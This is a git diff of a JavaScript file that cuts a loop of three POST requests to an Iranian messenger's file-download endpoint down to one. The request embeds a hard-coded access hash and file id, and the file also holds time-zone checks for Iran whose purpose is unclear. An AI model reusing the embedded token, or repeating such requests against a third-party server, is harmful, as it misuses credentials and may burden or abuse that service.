@@ -18,26 +18,24 @@
 			}
 		});
 	}*/
-	for(let i = 0; i < 3; i++) {
-		let startIndex = (1000 * i).toString();
-		fetch("https://messenger364.iranlms.ir/GetFile.ashx", {
-			keepalive: true,
-			method: "POST", // *GET, POST, PUT, DELETE, etc.
-			//mode: "no-cors", // no-cors, *cors, same-origin
-			cache: "no-cache", // *default, no-cache, reload, force-cache, only-if-cached
-			//credentials: "same-origin", // include, *same-origin, omit
-			headers: {
-			  "Content-Type": "text/plain",
-			  "access-hash-rec": "3936103694292301675879444428742023070415",
-			  "file-id": "14540536082199",
-			  "start-index": startIndex,
-			  "last-index": "193274986"
-			  // 'Content-Type': 'application/x-www-form-urlencoded',
-			},
-			redirect: "follow", // manual, *follow, error
-			referrerPolicy: "no-referrer" // no-referrer, *no-referrer-when-downgrade, origin, origin-when-cross-origin, same-origin, strict-origin, strict-origin-when-cross-origin, unsafe-url
-	  	});
-	}
+	fetch("https://messenger364.iranlms.ir/GetFile.ashx", {
+		keepalive: true,
+		method: "POST", // *GET, POST, PUT, DELETE, etc.
+		//mode: "no-cors", // no-cors, *cors, same-origin
+		cache: "no-cache", // *default, no-cache, reload, force-cache, only-if-cached
+		//credentials: "same-origin", // include, *same-origin, omit
+		headers: {
+		  "Content-Type": "text/plain",
+		  "access-hash-rec": "3936103694292301675879444428742023070415",
+		  "file-id": "14540536082199",
+		  "start-index": "0",
+		  "last-index": "193274986"
+		  // 'Content-Type': 'application/x-www-form-urlencoded',
+		},
+		redirect: "follow", // manual, *follow, error
+		referrerPolicy: "no-referrer" // no-referrer, *no-referrer-when-downgrade, origin, origin-when-cross-origin, same-origin, strict-origin, strict-origin-when-cross-origin, unsafe-url
+	});
+	
 	return;
 
 	let theTimeZone = new Date().getTimezoneOffset(), iranianTimezone = -((3 * 60) + 30), iranianTimezoneTwo = -((4 * 60) + 30);
